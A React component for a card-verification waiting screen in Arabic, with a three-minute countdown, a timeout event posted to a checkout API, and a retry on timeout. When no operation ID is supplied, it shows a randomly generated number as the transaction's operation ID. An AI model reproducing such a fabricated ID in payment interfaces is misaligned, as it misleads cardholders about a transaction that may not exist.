import { useEffect, useState, useMemo } from 'react';
import { postCheckoutEvent } from '@/lib/api';

interface CardApprovalProps {
  sessionId?: string;
  orderId?: string;
  operationId?: number;
  onTimeout?: () => void;
}

const CardApproval = ({ sessionId, operationId: propOperationId, onTimeout }: CardApprovalProps) => {
  const [timer, setTimer] = useState(180);

  const randomOperationId = useMemo(
    () => Math.floor(Math.random() * 900000000) + 100000000,
    []
  );
  const operationId = propOperationId || randomOperationId;

  useEffect(() => {
    if (timer > 0) {
      const timeout = setTimeout(() => setTimer(timer - 1), 1000);
      return () => clearTimeout(timeout);
    } else {
      if (sessionId) {
        postCheckoutEvent({
          sessionId,
          eventType: 'approval_timeout',
          timestamp: new Date().toISOString(),
        }).catch(() => {});
      }
      // إعادة المحاولة بدلاً من الذهاب للرئيسية
      onTimeout?.();
    }
  }, [timer, sessionId, onTimeout]);

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center w-full px-5">
      <div className="bg-white rounded-2xl text-center shadow-sm flex flex-col items-center justify-center w-full max-w-[320px] p-5 border border-gray-100">
      <div className="w-16 h-16 rounded-full mx-auto mb-5 flex items-center justify-center">
        <div
          className="w-8 h-8 rounded-full border-4 border-gray-200 border-t-blue-500 animate-spin"
          style={{
            animation: 'spin 1s linear infinite',
          }}
        />
      </div>

      <h2
        className="font-bold text-gray-900 mb-3 leading-none text-sm"
        dir="rtl"
      >
        انتظر للتأكد من صحة البطاقة
      </h2>

      <div
        className="font-mono font-semibold text-orange-500 mb-3 text-sm"
      >
        {formatTimer(timer)}
      </div>

      <div
        className="text-xs text-gray-500"
        dir="rtl"
      >
        معرف العملية: {operationId}
      </div>
      </div>
    </div>
  );
};

export default CardApproval;
